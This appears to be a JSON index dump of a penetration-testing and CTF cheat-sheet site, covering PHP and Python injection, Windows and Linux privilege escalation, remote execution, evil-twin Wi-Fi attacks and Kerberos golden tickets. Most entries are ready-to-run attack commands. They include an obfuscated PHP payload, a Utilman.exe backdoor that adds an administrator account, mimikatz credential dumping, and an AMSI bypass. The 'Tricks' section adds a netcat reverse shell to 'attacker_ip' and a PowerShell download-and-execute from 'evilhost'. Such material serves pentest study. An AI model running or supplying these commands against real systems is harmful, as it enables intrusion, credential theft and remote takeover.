(https://www.suncalc.org/#/48.8376,2.3456,8/2020.05.08/12:42/1/3) Indoor geolocation thread (https://twitter.com/nixintel/status/1266343126567997440?s=20) Worlds Electric Plugs (https://www.iec.ch/worldplugs/) CommonCrawl (https://commoncrawl.org/) Identifying Plants (https://identify.plantnet.org/) CommonCrawl (https://commoncrawl.org/) Hate Symbols Database (https://www.adl.org/hate-symbols) French Laws Legifrance (https://beta.legifrance.gouv.fr/) War Ship Searcher / Database (https://warsearcher.com/shipsearcher/) License Plates of the World (http://worldlicenseplates.com/) World-wide collection of industrial designs : WIPO (https://www3.wipo.int/designdb/en/index.jsp) Geotips (https://geotips.net/) Darknet markets for investigators (https://www.osintme.com/index.php/2020/11/21/list-of-darknet-markets-for-investigators/) World Postal Codes (https://worldpostalcode.com/) Flowchart for European languages (https://forum.duolingo.com/comment/33070800) Flowchart for Cyrillic Languages (https://twitter.com/LockpickingPete/status/1355741207629090816?s=19) Thingful.net service to get some IoT devices (https://www.thingful.net)  "
},
{
	"uri": "/web-pentest/php-vulnerabilities/functions/",
	"title": "PHP Functions",
	"tags": [],
	"description": "",
	"content": " Assert() # The assert() function will execute code in params # Example using challenge ?page=.. Warning : assert() : Assertion \u0026#34;strpos(’includes/...php’, ’..’) === false\u0026#34; failed in path/index.php on line 8 # The request looks like this assert(\u0026#34;strpos(\u0026#39;includes/\u0026#39; . $_GET[\u0026#39;page\u0026#39;] . \u0026#39;.php\u0026#39;, \u0026#39;..\u0026#39;) === false\u0026#34;) # If we inject this ?page=salade.php\u0026#39;,\u0026#39;..\u0026#39;) || print(\u0026#39;tomate\u0026#39;) || strpos(\u0026#39;oignons # The request will look like assert(\u0026#34;strpos(\u0026#39;/includes/salade.php\u0026#39;,\u0026#39;..\u0026#39;) || print(\u0026#39;tomate\u0026#39;) || strpos(\u0026#39;oignons.php\u0026#39;,\u0026#39;..\u0026#39;) ===false\u0026#34;) # Then, to exploit ?page=salade.php\u0026#39;,\u0026#39;..\u0026#39;) || show_source(\u0026#39;.passwd\u0026#39;) || strpos(\u0026#39;oignons \nPHP preg_replace() # In PHP, regular expressions need delimiter preg_match(\u0026#34;recherche\u0026#34;,\u0026#34;contenu\u0026#34;); # wrong preg_match(\u0026#34;/recherche/\u0026#34;,\u0026#34;contenu\u0026#34;); # OK # preg_replace offers an option to execute code preg_replace(\u0026#34;input1search\u0026#34;,\u0026#34;input2replace\u0026#34;,\u0026#34;input3content\u0026#34;); preg_replace(\u0026#34;/a/e\u0026#34;,\u0026#34;print(123)\u0026#34;,\u0026#34;abcd\u0026#34;); preg_replace(\u0026#34;/a/e\u0026#34;,\u0026#34;print_r(scandir(\u0026#39;.\u0026#39;))\u0026#34;,\u0026#34;abcd\u0026#34;); preg_replace(\u0026#34;/a/e\u0026#34;,\u0026#34;file_get_contents(\u0026#39;flag.php\u0026#39;)\u0026#34;,\u0026#34;abcd\u0026#34;); \nPHP preg_match() # It is possible to bypass some functions like preg_match by injecting non-alphanumeric char # If the application uses eval() on the user input, the payload will still be executed # Application code if(!preg_match(\u0026#39;/[a-zA-Z`]/\u0026#39;, $_POST[\u0026#39;input\u0026#39;])){ print \u0026#39;\u0026lt;fieldset\u0026gt;\u0026lt;legend\u0026gt;Result\u0026lt;/legend\u0026gt;\u0026#39;; eval(\u0026#39;print \u0026#39;.$_POST[\u0026#39;input\u0026#39;].\u0026#34;;\u0026#34;); print \u0026#39;\u0026lt;/fieldset\u0026gt;\u0026#39;; } # Exploitation and Bypass # You can encode the payload in octal → file_get_contents(\u0026#34;.passwd\u0026#34;) → \u0026#34;\\146\\151\\154\\145\\137\\147\\145\\164\\137\\143\\157\\156\\164\\145\\156\\164\\163\u0026#34;(\u0026#34;\\056\\160\\141\\163\\163\\167\\144\u0026#34;) # You can also use non alphanumeric char (https://github.com/v1ll41n/Und3rCov3r) echo -n “phpinfo();” \u0026gt; tmp.php php Und3rCov3r.ph 1 tmp.php # If will create an alphax.php file containing the encoded payload $_[]++;$_[]=$_._;$_____=$_[(++$__[])][(++$__[])+(++$__[])+(++$__[])];$_=$_[$_[+_]];$___=$__=$_[++$__[]];$____=$_=$_[+_];$_++;$_++;$_++;$_=$____.++$___.$___.++$_.$__.++$___;$__=$_;$_=$_____;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$___=+_;$___.=$__;$___=++$_^$___[+_];$______________=+_;$______++;$_______++;$_______++;$________++;$________++;$________++;$_________++;$_________++;$_________++;$_________++;$__________++;$__________++;$__________++;$__________++;$__________++;$___________++;$___________++;$___________++;$___________++;$___________++;$___________++;$____________++;$____________++;$____________++;$____________++;$____________++;$____________++;$____________++;$_____________++;$_____________++;$_____________++;$_____________++;$_____________++;$_____________++;$_____________++;$_____________++; $__(\u0026#39;$_=\u0026#34;\u0026#39;.$___.$______.$___________.$______________.$___.$______.$__________.$______________.$___.$______.$___________.$______________.$___.$______.$__________.$______.$___.$______.$__________.$___________.$___.$______.$_________.$___________.$___.$______.$__________.$____________.$___.$__________.$______________.$___.$__________.$______.$___.$____________.$________.\u0026#39;\u0026#34;\u0026#39;);$__($_); # You can then for example read file → readfile(\u0026#34;.passwd\u0026#34;); $_[]++;$_[]=$_._;$_____=$_[(++$__[])][(++$__[])+(++$__[])+(++$__[])];$_=$_[$_[+_]];$___=$__=$_[++$__[]];$____=$_=$_[+_];$_++;$_++;$_++;$_=$____.++$___.$___.++$_.$__.++$___;$__=$_;$_=$_____;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$___=+_;$___.=$__;$___=++$_^$___[+_];$______________=+_;$______++;$_______++;$_______++;$________++;$________++;$________++;$_________++;$_________++;$_________++;$_________++;$__________++;$__________++;$__________++;$__________++;$__________++;$___________++;$___________++;$___________++;$___________++;$___________++;$___________++;$____________++;$____________++;$____________++;$____________++;$____________++;$____________++;$____________++;$_____________++;$_____________++;$_____________++;$_____________++;$_____________++;$_____________++;$_____________++;$_____________++; $__(\u0026#39;$_=\u0026#34;\u0026#39;.$___.$______.$___________.$_______.$___.$______.$_________.$__________.$___.$______.$_________.$______.$___.$______.$_________.$_________.$___.$______.$_________.$___________.$___.$______.$__________.$______.$___.$______.$__________.$_________.$___.$______.$_________.$__________.$___.$__________.$______________.$___.$_________.$_______.$___.$__________.$___________.$___.$______.$___________.$______________.$___.$______.$_________.$______.$___.$______.$___________.$________.$___.$______.$___________.$________.$___.$______.$___________.$____________.$___.$______.$_________.$_________.$___.$_________.$_______.$___.$__________.$______.$___.$____________.$________.\u0026#39;\u0026#34;\u0026#39;);$__($_);"
},
{
	"uri": "/web-pentest/resources-discovery/parameters/",
	"title": "Parameters",
	"tags": [],
	"description": "",
	"content": " Hidden parameters Comparison https://4rt.one/blog/1.html x8 https://github.com/sh1yo/x8 # Send parameters via query x8 -u \u0026#34;https://example.com/\u0026#34; -w \u0026lt;wordlist\u0026gt; # With some default parameters: x8 -u \u0026#34;https://example.com/?something=1\u0026#34; -w \u0026lt;wordlist\u0026gt; # Send parameters via body x8 -u \u0026#34;https://example.com/\u0026#34; -X POST --as-body -w \u0026lt;wordlist\u0026gt; Arjun # Sometimes hidden parameters are set on pages # You can use tools like Arjun to find them (https://github.com/s0md3v/Arjun) python3 arjun.py -u https://api.example.com/endpoint --get # Multi threading python3 arjun.py -u https://api.example.com/endpoint --get -t 22 # Delay between requests python3 arjun.py -u https://api.example.com/endpoint --get -d # You can also use patator # GET patator http_fuzz url=\u0026#39;url/FILE0=1\u0026#39; 0=parameters.txt -x ignore:fgrep=\u0026#39;error reflected content\u0026#39; # POST patator http_fuzz url=\u0026#39;url/\u0026#39; method=POST body=\u0026#39;FILE0=1\u0026#39; 0=wordlist.txt -x ignore:fgrep=\u0026#39;error reflected content\u0026#39; \nOpen Redirect # Some examples verification-success?redirectTo=https%3a%2f%2fgoogle%2ecom%5c%2ewww%2eupwork%2ecom%2f\u0026amp;flowName=client_high_potential redirect_after_login=https%3a%2f%2f%63%61%72%64s%2etwitter%2ecom%2fcards%2f18ce54su0k1%2f6tc5h launchauth/?webbasedpurchasing=1\u0026amp;transid=2614806773554997295\u0026amp;authurl=https%3A%2F%2Fduckduckgo.com%2Forb%2Forb%3FACTION%3DDO_START%26REF%3D000000003700003159190000100001%26MAC%3D7UYgidiXPXlSwepsEkIkt2cjtzUjBN4cskq05erf%252Bhk%253D\u0026amp;s=5b57c3c66fea1edb71950f1b login?u=2\u0026amp;to=YXdheS5waHA/dG89aHR0cDovL2FtcC5ncy9Wb3VxJnBvc3Q9LTIwNjI5NzI0XzExNjAyMDImY2Nfa2V5P \nParameters pollution # Unicode char can cause breaks in some applications # Exemple with the pile of poo https://emojipedia.org/pile-of-poo/ 💩"
},
{
	"uri": "/windows-systems/local-and-physical/physical_access/",
	"title": "Physical Access",
	"tags": [],
	"description": "",
	"content": " Live boot from Kali # - USB Live Kali # - Mount the Windows system disk # - Get SAM and SYSTEM files from \u0026#34;C:\\Windows\\System32\\config\\\u0026#34; # - Extract hashes → samdump2 SYSTEM SAM \u0026gt; hash.txt # - Crack hashes using JTR (john -format=NT hash.txt) or Hashcat # - You may have to use “bkhive\u0026#34; on the SYSTEM file first # - John format can also be NT2 \nUtilman.exe attack # You can access a SYSTEM cmd shell if you have access to the filesystem # utilman.exe can be run BEFORE login by \u0026#34;WinKey + U\u0026#34; # If you can access filesystem and change utilman.exe by a cmd.exe, SYSTEM shell will be run. # Access can be done by live bootable key (Linux, Windows..) # From a Windows 10 bootable key -\u0026gt; SHIFT + F10 to access filesystem move d:\\windows\\system32\\utilman.exe d:\\windows\\system32\\utilman.exe.bak copy d:\\windows\\system32\\cmd.exe d:\\windows\\system32\\utilman.exe # OR C:\\ cd windows\\system32 ren utilman.exe utilman.exe.bak copy cmd.exe utilman.exe # Then on the logon screen --\u0026gt; WinKey + U # And then net user NewGuy abc123 /add net localgroup Administrators NewGuy /add# Reverting # To restore utilman.exe, in the Command Prompt type in: C: cd windows\\system32 del utilman.exe ren utilman.exe.bak utilman.exe"
},
{
	"uri": "/network/port-scanning/",
	"title": "Ports Scanning",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/web-pentest/tools/postman/",
	"title": "Postman",
	"tags": [],
	"description": "",
	"content": " https://www.guru99.com/postman-tutorial.html https://openclassrooms.com/fr/courses/4668056-construisez-des-microservices/5123020-testez-votre-api-grace-a-postman https://www.toolsqa.com/postman-tutorial/ https://amethyste16.wordpress.com/2016/02/24/tutoriel-postman/ \nUser Interface Header # Import --\u0026gt; Used to import collection or environment. # Runner --\u0026gt; Automation tests can be executed through the Collection Runner. # Workspace --\u0026gt; You can divide work using workspaces Sidebar # History --\u0026gt; Past requests that you have sent will be displayed in History. # This makes it easy to track actions that you have done. # Organize --\u0026gt; your test suite by creating collections. # Each collection may have subfolders and multiple requests. # A request or folder can also be duplicated as well Request zone # Request tab --\u0026gt; Display the current request # HTTP method to use # Endpoint (URL) # Save --\u0026gt; If there are changes to a request, clicking save is a must so that new # changes will not be lost or overwritten # Params --\u0026gt; GET or POST... # Authorization --\u0026gt; If you have to use bearer token, username/password etc... # Headers --\u0026gt; To set headers such as content type JSON \nGET and POST Requests # GET Requests # Set your HTTP request to GET. # In the request URL field, input link (including parameters) # Click Send # You will see 200 OK Message# POST Requests # Set your HTTP request to POST. # Input the link # Switch to the Body tab # Use for example raw and choose the type (JSON ?) # Copy and paste just one user result and change for example the ID to request another user # Click Send. # Status: 201 Created should be displayed # Posted data are showing up in the body \nRequest Parameterization # Data Parameterization is one of the most useful features of Postman. # Instead of creating the same requests with different data, you can use variables with parameters. # These data can be from a data file or an environment variable. # Parameterization helps to avoid repetition of the same tests and iterations # can be used for automation testing. # Parameters are created through the use of double curly brackets: {{sample}}.# Set your HTTP request to GET # {{url}}/users --\u0026gt; No result because the environment is not set # Click the eye # Click edit to set the variable to a global environment which can be used in all collections. # set the name to the url which is your https://domain.com # Go back to your Get request then click send. There should now be results for your request. "
},
{
	"uri": "/linux-systems/programing-languages/python/",
	"title": "Python",
	"tags": [],
	"description": "",
	"content": " Input() exploitation # In Python2, input function is vulnerable # input(x) = eval(raw_input(x)) # Means that user inputs will be executed # You can exec code Please enter password : sys.stdout.write(open(\u0026#34;.passwd\u0026#34;).readline()) 13373439872909134298363103573901 # Another Please enter password : __import__(\u0026#39;os\u0026#39;).system(\u0026#39;cat /challenge/shell/shell6/.passwd \u0026gt; /tmp/flag\u0026#39;) cat /tmp/flag # Another Please enter password : __import__(\u0026#39;shutil\u0026#39;).copyfile(\u0026#39;/challenge/shell/shell6/.passwd\u0026#39;, \u0026#39;/tmp/flag2\u0026#39;) # You can even get a shell Please enter password : __import__(\u0026#39;os\u0026#39;).system(\u0026#39;sh\u0026#39;) # Another Please enter password : input(open(\u0026#34;.passwd\u0026#34;).readline()) # Another Please enter password : __builtins__.__dict__[\u0026#39;print\u0026#39;](__builtins__.__dict__[\u0026#39;open\u0026#39;](\u0026#39;.passwd\u0026#39;, \u0026#39;r\u0026#39;).read()) \nPyjail - Only print and no quotes # Exploration exit / exit() / exit(1) / exit(\u0026#39;a\u0026#39;) # Try to assign variable, use import # Only exit is interesting # You can brutefore argument or try to get information about the code # You can try locally def test( flag_input ): if flag_input == 12345: print \u0026#34;Success!\u0026#34; else: print \u0026#34;Failure !\u0026#34; return 1 print dir(test) [\u0026#39;__call__\u0026#39;, \u0026#39;__class__\u0026#39;, \u0026#39;__closure__\u0026#39;, \u0026#39;__code__\u0026#39;, \u0026#39;__defaults__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__dict__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__format__\u0026#39;, \u0026#39;__get__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, \u0026#39;__globals__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__module__\u0026#39;, \u0026#39;__name__\u0026#39;, \u0026#39;__new__\u0026#39;, \u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__setattr__\u0026#39;, \u0026#39;__sizeof__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;func_closure\u0026#39;, \u0026#39;func_code\u0026#39;, \u0026#39;func_defaults\u0026#39;, \u0026#39;func_dict\u0026#39;, \u0026#39;func_doc\u0026#39;, \u0026#39;func_globals\u0026#39;, \u0026#39;func_name\u0026#39;] # So you can use it like this print exit.func_code # Same code again.. And.. print exit.func_code.co_consts # You can see the interesting variable and use it like this exit(exit.func_code.co_consts[1]) \nPyjail - No dots, quotes and some restricted functions # dir() is doing a return. You can see it if it\u0026#39;s executed in the same environment # When it goes through an eval(), the return remains in this environment, so you need to print it print dir() print dir(getout) print dir(getout)[29] # No dots, but you can access the __globals___ object using getattr() # dir() will give you the others objects accessible print dir(getattr(getout, dir(getout)[11])) # getattr() in that case will give you the content of that __globals__ print getattr(getout, dir(getout)[11]) # Then, if there is a dictionnary you can access keys and values, in a loop for example Keys -- for k in getattr(getout, dir(getout)[11]):print k Values -- for k in getattr(getout, dir(getout)[11]):print getattr(getout, dir(getout)[11])[k] Flag -- for k in getattr(getout, dir(getout)[11]):getout(getattr(getout, dir(getout)[11])[k]) # You can also use values() print dir(dict)[42] print getattr(getattr(getout, dir(getout)[29]),dir(dict)[42]) print getattr(getattr(getout, dir(getout)[29]),dir(dict)[42])() print getattr(getattr(getout, dir(getout)[29]),dir(dict)[42])()[7] getout(getattr(getattr(getout, dir(getout)[29]),dir(dict)[42])()[7]) # You can transform dictionary to list and then just access it print(list(getattr(getout, dir(getout)[-2]))) print(getattr(getout, dir(getout)[-2])[list(getattr(getout, dir(getout)[-2]))[7]]) getout(getattr(getout, dir(getout)[-2])[list(getattr(getout, dir(getout)[-2]))[7]]) # You can also change the password value to avoid string restrictions getattr(getout,dir(getout)[11])[list(getattr(getout,dir(getout)[11]))[7]]=1234 print getattr(getout,dir(getout)[11])[list(getattr(getout,dir(getout)[11]))[7]] getout(1234) # You can recreate dot using bytes bytes(round(1/3))[1]) # And then use the \u0026#34;command\u0026#34; function to grab “passw” and “d” to get the correct string back bytes(command[-7:-2] + command[-1]) (bytes(round(1/3))[1] + command[-7:-2] + command[-1]) print(next(open(bytes(round(1/3))[1] + command[-7:-2] + command[-1]))) \nPyjail - Generate a shell # Trough help and a w3m console help() help\u0026gt; modules help\u0026gt; antigravity @ → /bin/sh /bin/sh 1\u0026gt;\u0026amp;2 reset cat .passwd"
},
{
	"uri": "/linux-systems/recon_enumeration/",
	"title": "Recon and Enumeration",
	"tags": [],
	"description": "",
	"content": " Resources https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ # Tmux shortcuts https://gist.github.com/MohamedAlaa/2961058 \nBasics hostname whoami id ifconfig uname -a uname -m # Check version using searchsploit -w distrib searchsploit -w kernel_version # Test trivials login combinaison # check /etc/passwd # then su login=password # Look for known machines arp -a # Get network configuration /sbin/ifconfig -a; cat /etc/network/interfaces; cat /etc/sysconfig/network; cat /etc/resolv.conf; cat /etc/sysconfig/network; cat /etc/networks; iptables -L; hostname; dnsdomainname # Find Linux distribution and version cat /etc/issue; cat /etc/*-release; cat /etc/lsb-release; cat /etc/redhat-release; # Get environment variables cat /etc/profile; cat /etc/bashrc; cat ~/.bash_profile; cat ~/.bashrc; cat ~/.bash_logout; env; set # Look for files and getting filename, path, user, group, mode as columns find /home -printf -type f \u0026#34;%f\\t%p\\t%u\\t%g\\%m\\n\u0026#34; 2\u0026gt;/dev/null | column -t \nRunning Services netstat -lantp lsof -i sockstat -l ss -lantp # Find printers lpstat -a # Network # TCP ports, UDP ports, numerical adresses, only listening ports, PID of process netstat -tunlp \nChecking Different Things # Check sudo rights sudo -l # User bash history cat ~/.bash_history; cat ~/.nano_history; cat ~/.atftp_history; cat ~/.mysql_history; cat ~/.php_history # Look for writable configuration files find /etc/ -writable -type f 2\u0026gt;/dev/null # Checks web config files or databases config files # If one of them is here, exploits can be compiled on the target machine which gcc g++ cc # Look for SUID or GUID binaries find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \\; 2\u0026gt;/dev/null find / -perm -1000 -type d 2\u0026gt;/dev/null find / -perm -g=s -type f 2\u0026gt;/dev/null # ARP cache can get you new IP cat /proc/net/arp \nPspy # pspy is a command line tool designed to snoop on processes without need # for root permissions. It allows you to see commands run by other # users, cron jobs, etc. as they execute. https://github.com/DominicBreuker/pspy \nUsefull scripts https://github.com/pentestmonkey/unix-privesc-check https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh # Check for root cron jobs https://github.com/codingo/OSCP-2/blob/master/BASH/CronJobChecker.sh # LinuxPrivCheck https://github.com/codingo/OSCP-2/blob/master/BASH/LinuxPrivCheck.sh # Clear and efficient https://github.com/diego-treitos/linux-smart-enumeration \nSwap Digger https://github.com/sevagas/swap_digger # swap_digger is a bash script used to automate Linux swap analysis for post-exploitation # or forensics purpose. It automates swap extraction and searches for Linux user credentials, # Web form credentials, Web form emails, HTTP basic authentication, WiFi SSID and keys, etc. ./swap_digger.sh [ OPTIONS ] Options : -x, --extended Run Extended tests on the target swap to retrieve other interesting data (web passwords, emails, wifi creds, most accessed urls, etc) -g, --guessing Try to guess potential passwords based on observations and stats Warning: This option is not reliable, it may dig more passwords as well as hundreds false positives. -h, --help Display this help. -v, --verbose Verbose mode. -l, --log Log all outputs in a log file (protected inside the generated working directory). -c, --clean Automatically erase the generated working directory at end of script (will also remove log file) -r PATH, --root-path=PATH Location of the target file-system root (default value is /) Change this value for forensic analysis when target is a mounted file system. This option has to be used along the -s option to indicate path to swap device. -s PATH, --swap-path=PATH Location of swap device or swap dump to analyse Use this option for forensic/remote analysis of a swap dump or a mounted external swap partition. This option should be used with the -r option where at least /\u0026lt;root-path\u0026gt;/etc/shadow exists. -S, --swap-search Search for all available swap devices (use for forensics)."
},
{
	"uri": "/windows-systems/exploitation/remote_execution_techniques/",
	"title": "Remote Execution Techniques",
	"tags": [],
	"description": "",
	"content": " Impacket tools https://www.secureauth.com/labs/open-source-tools/impacket# psexec # PSEXEC like functionality example using RemComSvc(https://github.com/kavika13/RemCom). psexec.py domain/user:password@IP \u0026lt;command\u0026gt;# smbexec # A similar approach to PSEXEC w/o using RemComSvc. The technique is described here. # Instantiating a local smbserver to receive the output of the commands. # This is useful in the situation where the target machine does NOT have a writeable share available. smbexec.py domain/user:password@IP \u0026lt;command\u0026gt;# atexec # This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command. atexec.py domain/user:password@IP \u0026lt;command\u0026gt;# wmiexec # A semi-interactive shell, used through Windows Management Instrumentation. # It does not require to install any service/agent at the target server. Runs as Administrator. Highly stealthy. wmiexec.py domain/user:password@IP \u0026lt;command\u0026gt;# dcomexec # A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. ## Currently supports MMC20.Application, ShellWindows and ShellBrowserWindow objects. dcomexec.py domain/user:password@IP \u0026lt;command\u0026gt; \nWinRM # You can use WinRM to execute remote commands and even get a shell # Port 5985 needs to be opended # Default endpoint is /wsmanrequire \u0026#39;winrm\u0026#39; conn = WinRM::Connection.new( endpoint: \u0026#39;http://ip:5985/wsman\u0026#39;, user: \u0026#39;domain/user\u0026#39;, password: \u0026#39;password\u0026#39;, ) command=\u0026#34;\u0026#34; conn.shell(:powershell) do |shell| until command == \u0026#34;exit\\n\u0026#34; do print \u0026#34;PS \u0026gt; \u0026#34; command = gets output = shell.run(command) do |stdout, stderr| STDOUT.print stdout STDERR.print stderr end end puts \u0026#34;Exiting with code #{output.exitcode}\u0026#34; end \nEvil-WinRm # Evil-WinRM is another complete tool for WinRIM https://github.com/Hackplayers/evil-winrm # Simple usage $ ruby evil-winrm.rb -i 10.10.10.172 -u user -p password # Upload and Download \u0026gt; upload local_filename (destination_filename) \u0026gt; download remote_filename (destination_filename) # List all services showing if there your account has permissions over each one \u0026gt; services # Menu listing loaded modules (default presented below) \u0026gt; menu # You can load local PS1 scripts just by typing script name # The scripts must be in the path set at -s argument \u0026gt; Powerview.ps1 \u0026gt; menu# Using advanced commands # Invoke-Binary # Allows exes compiled from c# to be executed in memory # The executables must be in the path set at -e argument \u0026gt; Invoke-Binary /opt/csharp/Binary.exe \u0026#39;param1, param2, param3\u0026#39; # DLL Loader # allows loading dll libraries in memory. The dll file can be hosted by smb, http or locally. # You can then use auto-completion \u0026gt; Dll-Loader -http -path http://xx.xx.xx.xx/sharpsploit.dll \u0026gt; [Sharpsploit.Credentials.Mimikatz]::LogonPasswords() # Donut Loader # allows to inject x64 payloads generated with awesome donut technique # No need to encode the payload.bin, just generate and inject https://github.com/Hackplayers/Salsa-tools/blob/master/Donut-Maker/donut-maker.py python3 donut-maker.py covenant.exe # Bypass-4MSI # patchs AMSI protection \u0026gt; amsiscanbuffer \u0026gt; Bypass-4MSI \u0026gt; amsiscanbuffer# Using Kerberos # First, date synchro rdate -n \u0026lt;dc-ip\u0026gt; # Ticket generation (ticketer, kirbi rubeus or mimikatz...) ticketer.py -dc-ip \u0026lt;dc_ip\u0026gt; -nthash \u0026lt;krbtgt_nthash\u0026gt; -domain-sid \u0026lt;domain_sid\u0026gt; -domain \u0026lt;domain_name\u0026gt; \u0026lt;user\u0026gt; python ticket_converter.py ticket.kirbi ticket.ccache # Add ccache ticket (2 ways) export KRB5CCNAME=/foo/var/ticket.ccache cp ticket.ccache /tmp/krb5cc_0 # Add realm to /etc/krb5.conf (for linux). Use of this format is important CONTOSO.COM = { kdc = fooserver.contoso.com } # Check ticket klist"
},
{
	"uri": "/wireless/rogue_ap/",
	"title": "Rogue AP Attack",
	"tags": [],
	"description": "",
	"content": " General Informations # If you need several external eth interfaces, connect then at the beginning # To ensure having wlan0 and wlan1 # And avoid having wlan0mon and then wlan0 when you connect the second one # It could result in conflicts# Evil Twin / Hostapd-wpe is used against MSCHAPv2 access points, usually used by companies # Manually creating a rogue AP for classical WPA/WPA2 requires more configuration# You might need to patch your hostapd version https://github.com/aircrack-ng/aircrack-ng/tree/master/patches/wpe/hostapd-wpe \nEvil Twin attack # 1/ Start monitoring mode # If you plan to use deauth attack, connect the 2 eth interfaces at the same time # To avoid having wlan0mon and wlan0 (it can conflict) sudo airmon-ng start wlan0 # 2/ If process are blocking the monitoring mode, kill them sudo airmon-ng check kill sudo kill \u0026lt;PID\u0026gt; # 3/ Get the target AP (ESSID) # Your target can have multiples AP, and so multiples MAC addresses # They can run on differents channels sudo airodump wlan0mon # 4/ Then set the target in the configuration file sudo nano /etc/hostapd-wpe/hostapd-wpe.conf ssid=\u0026lt;ESSID\u0026gt; # 5/ Start AP # You will only get people that newly connects to the target AP # If you want to get people already connected, you need to push the attack further with deauth sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf # 6/ Start the second ethernet interface sudo airmon-ng start wlan1 # 7/ Deauth (In another terminal) # Based on the differents ESSID and channels found in step 3 # -0 is the number of deauth packet sent sudo aireplay-ng -0 10 -a \u0026lt;mac address\u0026gt; -c \u0026lt;channel\u0026gt; # Then wait for credz \\o/ # You will probably get NetNTLMv1 hashes you will need to crack \n"
},
{
	"uri": "/windows-systems/post-exploitation-techniques/silver_golden_tickets/",
	"title": "Silver and Golden Tickets",
	"tags": [],
	"description": "",
	"content": " Ticket generation from Linux # Generate a ticket or convert it (kekeo) to ccache format $ ticketer.py -nthash \u0026lt;hash\u0026gt; -domain-sid \u0026lt;sid\u0026gt; -domain \u0026lt;domain\u0026gt; \u0026lt;user\u0026gt; # Export the path in the right variable $ export KRB5CCNAME=/tmp/ticket.ccache $ klist # Exec and use the ticket $ /impacket/examples/psexec.py -k -n -debug DOMAIN/user@host # Dump NTDS $ proxychains secretsdump.py -k -no-pass qsec@DCFIL.PRAMAFIL.CORP -use-vss \nGolden Ticket # Golden Ticket \u0026gt; Nom du compte administrateur (Administrateur) \u0026gt; Nom complet du domaine (domain.local) \u0026gt; SID du domaine (S-1-5-21-1723555596-1415287819-2705645101) [whoami /user] \u0026gt; Hash NTLM du compte krbtgt (6194bd1a5bf3ecd542e8aac9860bddf0) mimikatz # privilege:debug mimikatz # lsadump::lsa /inject /name:krbtgt mimikatz # kerberos::golden /admin:Administrateur /domain:domain.local /sid:S-1-5-21-1723555596-1415287819-2705645101 /krbtgt:6194bd1a5bf3ecd542e8aac9860bddf0 /ticket:domain.local.kirbi /id:500 /ptt Use : mimikatz # kerberos::ptt domain.local.kirbi mimikatz # kerberos::list# Resource https://twitter.com/mpgn_x64/status/1241688547037532161 # Golden ticket and access denied ? # from cmd (elevated) \u0026gt; mimikatz kerberos::golden \u0026gt; klist add_bind \u0026lt;DOMAIN\u0026gt; \u0026lt;DC\u0026gt; \u0026gt; psexec \\\\dc\\ cmd \nPlaying with tickets on Windows # Sessions en cours mimikatz # sekurlsa::logonpasswords # Ticket TGT # Dump SPN PS C:\\\u0026gt; Find-PSServiceAccounts -DumpSPN Discovering service account SPNs in the AD Domain foo.local svcSQLServ/pc1.foo.local:1433 # Download Mimikatz PS C:\\\u0026gt; Invoke-Expression (New-Object Net.Webclient).downloadstring(\u0026#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1\u0026#39;) PS C:\\\u0026gt; Invoke-Mimikatz mimikatz(powershell) # sekurlsa::logonpasswords ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005) # Lister les tickets actifs ou les purger PS C:\\\u0026gt; Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::purge\u0026#34;\u0026#39; PS C:\\\u0026gt; Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::list\u0026#34;\u0026#39; PS C:\\\u0026gt; klist # Demander un ticket PS C:\\\u0026gt; Add-Type -AssemblyName System.IdentityModel PS C:\\\u0026gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \u0026#34;svcSQLServ/pc1.foo.local:1433\u0026#34; # Exporter un ticket mimikatz # kerberos::list /export # Crack Ticket python tgsrepcrack.py wordlist.txt ticket.kirbi"
},
{
	"uri": "/windows-systems/privilege-escalation/tricks/",
	"title": "Tricks",
	"tags": [],
	"description": "",
	"content": " Global Tricks https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/ https://guif.re/windowseop https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html # Getting shell in limited interpreter system(\u0026#34;start cmd.exe /k $cmd\u0026#34;) # Alternative execution (eq \u0026#39;cmd.exe /c\u0026#39;) https://twitter.com/CyberRaiju/status/1273597319322058752?s=20 explorer.exe /root # Reverse shell nc.exe attacker_ip attacker_port -e cmd.exe # From admin to SYSTEM psexec.exe -i -s %SystemRoot%\\system32\\cmd.exe # AV Bypass # You can generate mutated binary hyperion.exe ../backdoor.exe ../backdoor_mutation.exe # Download and exec powershell on target powershell.exe \u0026#34;IEX (New-Object Net.WebClient).DownloadString(\u0026#39;http://evilhost/Malicious.ps1\u0026#39;)\u0026#34; # Payload as a trusted binary # Copy your payload into %userprofile%\\AppData\\Local\\Microsoft\\Teams\\current\\ # Then %userprofile%\\AppData\\Local\\Microsoft\\Teams\\Update.exe --processStart payload.exe --process-start-args \u0026#34;whatever args\u0026#34; \nProcess Migration # Migration can be essential to get persistence # You might need to migrate into a classic process msf\u0026gt; ps aux msf\u0026gt; migrate \u0026lt;pid\u0026gt; # Automigrate is also sometimes needed if the shell is dying 